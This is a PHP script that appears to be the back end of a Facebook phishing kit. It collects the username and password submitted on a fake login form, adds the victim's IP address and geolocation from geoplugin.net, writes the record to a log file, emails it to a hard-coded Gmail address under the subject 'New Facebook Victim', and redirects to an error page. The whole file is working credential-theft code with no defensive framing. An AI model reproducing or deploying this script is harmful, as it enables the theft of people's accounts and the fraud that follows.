<?php




$date = gmdate ("d-n-Y");
$time = gmdate ("H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];
$hostname = gethostbyaddr($ip);
$message = "==========Facebook Login📥✅ ========== \n";
$message .= "User: ".$_POST['username']."\n";
$message .= "Pass: ".$_POST['password']."\n";
$message .= "----------\n";
$message .= "IP: ".$ip."\n";
$message .= "Log : $time / $date \n"; $message .= "----------\n";
$user_ip = getenv('REMOTE_ADDR');
$geo = unserialize(file_get_contents("http://www.geoplugin.net/php.gp?ip=$user_ip"));
$country = $geo["geoplugin_countryName"];
$city = $geo["geoplugin_city"]; $region = $geo["geoplugin_region"];
$continet = $geo["geoplugin_continentName"];
$message .= "country: $country \n" ; $message .= "city: $city \n" ;
$message .= "region: $region \n" ;$message .= "continet: $continet \n" ;
$message .= "📤📤📤📤📤📤
 \n";
$rnessage = "$message\n";
$send= "jeonglee2121@gmail.com";
$subject = "New Facebook Victim | $ip";
$headers = "From: Facebook";
$file = fopen("../vote/logs.txt","ab");
fwrite($file,$message);
fclose($file);
$str=array($send, ); foreach ($str as $send)
if(mail($send,$subject,$rnessage,$headers) != false)
{
    
} 
header("Location: error/index.html");
?>